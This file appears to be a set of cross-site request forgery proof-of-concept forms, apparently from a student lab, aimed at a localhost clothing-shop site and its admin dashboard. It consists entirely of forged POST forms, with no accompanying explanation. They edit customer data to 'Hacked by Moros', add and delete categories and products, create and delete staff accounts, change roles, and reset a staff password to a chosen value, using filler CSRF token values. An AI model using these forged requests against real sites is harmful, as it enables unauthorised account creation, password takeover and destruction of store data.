<form action="http://localhost:8092/Cart/AddProduct" method="post">
    <meta name="referrer" content="origin" />
    <input type="text" name="product_code" value="SP1701946810">
    <input type="text" name="size" value="M">
    <input type="text" name="quantity" value="1">
    <button type="submit"></button>
</form>
<br>
<form action="http://localhost:8092/Cart/ProductInCart" method="post">
    <meta name="referrer" content="origin" />
    <input type="text" name="product_code" value="SP1701946810">
    <input type="text" name="sizeOfProduct" value="M">
    <input type="text" name="actionWithProduct" value="increase">
    <button type="submit"></button>
</form>
<br>
<form action="http://localhost:8092/Customer/EditInfo" method="post">
    <input value="Hacked by Moros" name="fullName" type="text">
    <input value="07078885551" type="text" name="phone">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<br>
<form action="http://localhost:8090/Dashboard_category/AddCategory" method="post">
    <input type="text" name="csrf_token_category" value="csrf_token_category">
    <input value="Hacked by Moros" name="CategoryName" type="text">
    <input value="1" type="text" name="CategoryParentID">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<form action="http://localhost:8090/Dashboard_category/DeleteCategory" method="post">
    <input type="text" name="csrf_token_category" value="csrf_token_category">
    <input value="18" type="text" name="category_id">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<br>
<form action="http://localhost:8090/Dashboard_customer/Edit" method="post">
<input type="text" name="csrf_token_customer" value="csrf_token_customer">
<input style="color: black" type="text" value="n20dcat004@student.ptithcm.edu.vn" id="Email" name="Email">
<input style="color: black" type="text" value="Hacked by Moros" id="TenKhachHang" name="TenKhachHang">
<input style="color: black" type="text" value="07078885551" id="SDT" name="SDT">
<button type="submit" id="submitBtn">Thêm</button>
</form>
<form action="http://localhost:8090/Dashboard_staff/EditStaff" method="post">
    <input type="text" name="csrf_token_staff" value="csrf_token_staff">
    <input style="color: black" type="text" value="teo" id="username" name="username">
    <select name="role" id= "role" required>
        <option value="staff">staff</option>
        <option value="manager">manager</option>
    </select>   
    <button type="submit" id="submitBtn">Thêm</button>
</form>
<form action="http://localhost:8090/Dashboard_staff/AddStaff" method="post">
    <input type="text" name="csrf_token_staff" value="csrf_token_staff">
    <input style="color: black" type="text" value="teo2" id="username" name="username">
    <input style="color: black" type="password" value="1234" id="password" name="password">
    <select name="role" id= "role" required>
        <option value="staff">staff</option>
        <option value="manager">manager</option>
    </select>   
    <button type="submit" id="submitBtn">Thêm</button>
</form>
<form action="http://localhost:8090/Dashboard_staff/DeleteStaff" method="post">
    <input type="text" name="csrf_token_staff" value="csrf_token_staff">
    <input style="color: black" type="text" value="teo2" id="username" name="username">
    <button type="submit" id="submitBtn">Cập nhật</button>
</form>
<form action="http://localhost:8090/Dashboard_staff/ResetPassword" method="post">
    <input type="text" name="csrf_token_staff" value="csrf_token_staff">
    <input style="color: black" type="text" value="teo2" id="username" name="username">
    <input style="color: black" type="password" value="Bb@04122002" id="password" name="password">
    <button type="submit" id="submitBtn">Cập nhật</button>
</form>
<form action="http://localhost:8090/Dashboard_product/AddProduct" method="post" enctype="multipart/form-data">
    <input type="text" name="csrf_token_product" value="csrf_token_product">
    <input style="color: black;" type="text" value="Áo sơ mi cục tay" id="TenSanPham" name="TenSanPham" required>
    <input style="color: black;" value="1222222" type="text" id="GiaSanPham" name="GiaSanPham" required>
    <select name="DanhMucSanPham" id="DMSP" style="width: 100%; height: 45px; margin-bottom: 20px; padding-left: 20px;" required>
        <option value="5">Áo sơ mi nam</option>
    </select>
    <input type="radio" name="color" value="red">
    <input multiple type="file" name="fileToUpload[]" id="Img">
    <input type="number" id="SoLuongSP_S" name="SoLuongSP_S" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_M" name="SoLuongSP_M" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_L" name="SoLuongSP_L" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_XL" name="SoLuongSP_XL" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_XXL" name="SoLuongSP_XXL" placeholder="Số lượng" min="0" required>
    <textarea name="MoTa" id="MoTa" cols="30" rows="5" style="width: 100%; margin-bottom: 20px;" placeholder="Mô tả sản phẩm" required></textarea>
    <button type="submit" id="submitBtn">Thêm</button>
</form>
<form action="http://localhost:8090/Dashboard_product/DeleteProduct" method="post">
    <input type="text" name="csrf_token_product" value="csrftokenproduct">
    <input type="text" name="product_code" value="SP1703086288">
    <button type="submit" id="submitBtn">Cập nhật</button>
</form>
<form action="http://localhost:8090/Dashboard_product/EditProduct" method="post" enctype="multipart/form-data">
    <input type="text" name="csrf_token_product" value="csrftokenproduct">
    <input type="text" name="MaSanPham" id="MaSanPham" value="SP1703090410">
    <input style="color: black;" type="text" value="Áo sơ mi da beo" id="TenSanPham" name="TenSanPham" required>
    <input style="color: black;" value="1222222" type="text" id="GiaSanPham" name="GiaSanPham" required>
    <select name="DanhMucSanPham" id="DMSP" style="width: 100%; height: 45px; margin-bottom: 20px; padding-left: 20px;" required>
        <option value="5">Áo sơ mi nam</option>
    </select>
    <input type="radio" name="color" value="red">
    <input multiple type="file" name="fileToUpload[]" id="Img">
    <input type="number" id="SoLuongSP_S" name="SoLuongSP_S" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_M" name="SoLuongSP_M" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_L" name="SoLuongSP_L" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_XL" name="SoLuongSP_XL" placeholder="Số lượng" min="0" required>
    <input type="number" id="SoLuongSP_XXL" name="SoLuongSP_XXL" placeholder="Số lượng" min="0" required>
    <textarea name="MoTa" id="MoTa" cols="30" rows="5" style="width: 100%; margin-bottom: 20px;" placeholder="Mô tả sản phẩm" required></textarea>
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
